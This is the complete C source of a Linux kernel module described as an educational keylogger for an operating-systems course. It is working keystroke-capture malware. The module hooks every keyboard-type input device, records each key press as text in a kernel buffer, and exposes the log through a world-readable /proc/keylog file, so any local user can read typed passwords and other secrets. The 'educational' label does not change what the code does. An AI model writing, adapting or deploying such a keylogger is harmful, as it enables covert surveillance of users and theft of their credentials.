
// keylogger.c - Educational Kernel Keylogger Module

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/spinlock.h>

#define PROC_NAME "keylog"
#define BUFFER_SIZE 4096

// Circular buffer for storing key events
static char *key_buffer;
static size_t buffer_pos = 0;
static spinlock_t buffer_lock;

// Proc entry
static struct proc_dir_entry *proc_entry;

// Input handler structure
static struct input_handler keylog_handler;

// Key code to character mapping (simplified, US layout)
static const char *keycode_to_string[] = {
    [KEY_A] = "a",
    [KEY_B] = "b",
    [KEY_C] = "c",
    [KEY_D] = "d",
    [KEY_E] = "e",
    [KEY_F] = "f",
    [KEY_G] = "g",
    [KEY_H] = "h",
    [KEY_I] = "i",
    [KEY_J] = "j",
    [KEY_K] = "k",
    [KEY_L] = "l",
    [KEY_M] = "m",
    [KEY_N] = "n",
    [KEY_O] = "o",
    [KEY_P] = "p",
    [KEY_Q] = "q",
    [KEY_R] = "r",
    [KEY_S] = "s",
    [KEY_T] = "t",
    [KEY_U] = "u",
    [KEY_V] = "v",
    [KEY_W] = "w",
    [KEY_X] = "x",
    [KEY_Y] = "y",
    [KEY_Z] = "z",
    [KEY_0] = "0",
    [KEY_1] = "1",
    [KEY_2] = "2",
    [KEY_3] = "3",
    [KEY_4] = "4",
    [KEY_5] = "5",
    [KEY_6] = "6",
    [KEY_7] = "7",
    [KEY_8] = "8",
    [KEY_9] = "9",
    [KEY_SPACE] = " ",
    [KEY_ENTER] = "[ENTER]\n",
    [KEY_TAB] = "[TAB]",
    [KEY_DOT] = ".",
    [KEY_COMMA] = ",",
    [KEY_SLASH] = "/",
    [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'",
    [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]",
    [KEY_BACKSLASH] = "\\",
    [KEY_MINUS] = "-",
    [KEY_EQUAL] = "=",
    [KEY_BACKSPACE] = "[BS]",
    [KEY_ESC] = "[ESC]",
    [KEY_LEFTSHIFT] = "[LSHIFT]",
    [KEY_RIGHTSHIFT] = "[RSHIFT]",
    [KEY_LEFTCTRL] = "[LCTRL]",
    [KEY_RIGHTCTRL] = "[RCTRL]",
    [KEY_LEFTALT] = "[LALT]",
    [KEY_RIGHTALT] = "[RALT]",
    [KEY_UP] = "[UP]",
    [KEY_DOWN] = "[DOWN]",
    [KEY_LEFT] = "[LEFT]",
    [KEY_RIGHT] = "[RIGHT]",
    [KEY_PAGEUP] = "[PGUP]",
    [KEY_PAGEDOWN] = "[PGDN]",
    [KEY_HOME] = "[HOME]",
    [KEY_END] = "[END]",
    [KEY_INSERT] = "[INS]",
    [KEY_DELETE] = "[DEL]",
    [KEY_F1] = "[F1]",
    [KEY_F2] = "[F2]",
    [KEY_F3] = "[F3]",
    [KEY_F4] = "[F4]",
    [KEY_F5] = "[F5]",
    [KEY_F6] = "[F6]",
    [KEY_F7] = "[F7]",
    [KEY_F8] = "[F8]",
    [KEY_F9] = "[F9]",
    [KEY_F10] = "[F10]",
    [KEY_F11] = "[F11]",
    [KEY_F12] = "[F12]",
    [KEY_CAPSLOCK] = "[CAPS]",
    [KEY_NUMLOCK] = "[NUMLOCK]",
    [KEY_SCROLLLOCK] = "[SCROLL]",
};

// Write to circular buffer
static void write_to_buffer(const char *str)
{
    size_t len = strlen(str);
    unsigned long flags;

    spin_lock_irqsave(&buffer_lock, flags);

    while (len > 0)
    {
        size_t to_copy = min(len, (size_t)(BUFFER_SIZE - buffer_pos));
        memcpy(key_buffer + buffer_pos, str, to_copy);
        buffer_pos = (buffer_pos + to_copy) % BUFFER_SIZE;
        str += to_copy;
        len -= to_copy;
    }

    spin_unlock_irqrestore(&buffer_lock, flags);
}

// Event handler callback - called when keyboard event occurs
static void keylog_event(struct input_handle *handle, unsigned int type,
                         unsigned int code, int value)
{
    // Only process key press events (value == 1)
    if (type == EV_KEY && value == 1)
    {
        if (code < ARRAY_SIZE(keycode_to_string) && keycode_to_string[code])
        {
            write_to_buffer(keycode_to_string[code]);
        }
        else
        {
            char tmp[16];
            snprintf(tmp, sizeof(tmp), "[%d]", code);
            write_to_buffer(tmp);
        }
    }
}

// Connect handler to input device
static int keylog_connect(struct input_handler *handler, struct input_dev *dev,
                          const struct input_device_id *id)
{
    struct input_handle *handle;
    int error;

    // Allocate handle
    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";

    // Register handle
    error = input_register_handle(handle);
    if (error)
    {
        pr_err("Failed to register input handle: %d\n", error);
        kfree(handle);
        return error;
    }

    // Start receiving events
    error = input_open_device(handle);
    if (error)
    {
        pr_err("Failed to open input device: %d\n", error);
        input_unregister_handle(handle);
        kfree(handle);
        return error;
    }

    pr_info("Connected to device: %s\n", dev->name);
    return 0;
}

// Disconnect handler from input device
static void keylog_disconnect(struct input_handle *handle)
{
    pr_info("Disconnected from device: %s\n", handle->dev->name);
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

// Device ID table - match keyboard devices
static const struct input_device_id keylog_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = {BIT_MASK(EV_KEY)},
    },
    {}, // Terminating entry
};

MODULE_DEVICE_TABLE(input, keylog_ids);

// Proc file read callback
static ssize_t keylog_proc_read(struct file *file, char __user *ubuf,
                                size_t count, loff_t *ppos)
{
    unsigned long flags;
    size_t len;
    char *temp_buffer;
    ssize_t ret;

    if (*ppos > 0)
        return 0;

    temp_buffer = kmalloc(BUFFER_SIZE, GFP_KERNEL);
    if (!temp_buffer)
        return -ENOMEM;

    spin_lock_irqsave(&buffer_lock, flags);
    memcpy(temp_buffer, key_buffer, BUFFER_SIZE);
    len = buffer_pos;
    spin_unlock_irqrestore(&buffer_lock, flags);

    if (count > len)
        count = len;

    if (copy_to_user(ubuf, temp_buffer, count))
    {
        kfree(temp_buffer);
        return -EFAULT;
    }

    *ppos = count;
    ret = count;

    kfree(temp_buffer);
    return ret;
}

// Proc file operations
static const struct proc_ops keylog_proc_ops = {
    .proc_read = keylog_proc_read,
};

// Module initialization
static int __init keylogger_init(void)
{
    int error;

    pr_info("Keylogger module loading...\n");

    // Allocate buffer
    key_buffer = kzalloc(BUFFER_SIZE, GFP_KERNEL);
    if (!key_buffer)
    {
        pr_err("Failed to allocate buffer\n");
        return -ENOMEM;
    }

    // Initialize spinlock
    spin_lock_init(&buffer_lock);

    // Create proc entry
    proc_entry = proc_create(PROC_NAME, 0444, NULL, &keylog_proc_ops);
    if (!proc_entry)
    {
        pr_err("Failed to create /proc/%s\n", PROC_NAME);
        kfree(key_buffer);
        return -ENOMEM;
    }

    // Initialize input handler
    keylog_handler.event = keylog_event;
    keylog_handler.connect = keylog_connect;
    keylog_handler.disconnect = keylog_disconnect;
    keylog_handler.name = "keylogger";
    keylog_handler.id_table = keylog_ids;

    // Register input handler
    error = input_register_handler(&keylog_handler);
    if (error)
    {
        pr_err("Failed to register input handler: %d\n", error);
        proc_remove(proc_entry);
        kfree(key_buffer);
        return error;
    }

    pr_info("Keylogger module loaded successfully\n");
    pr_info("Read logs with: cat /proc/%s\n", PROC_NAME);

    return 0;
}

// Module cleanup
static void __exit keylogger_exit(void)
{
    pr_info("Keylogger module unloading...\n");

    // Unregister input handler
    input_unregister_handler(&keylog_handler);

    // Remove proc entry
    proc_remove(proc_entry);

    // Free buffer
    kfree(key_buffer);

    pr_info("Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Educational Keyboard Logger for OS Course");
MODULE_VERSION("1.0");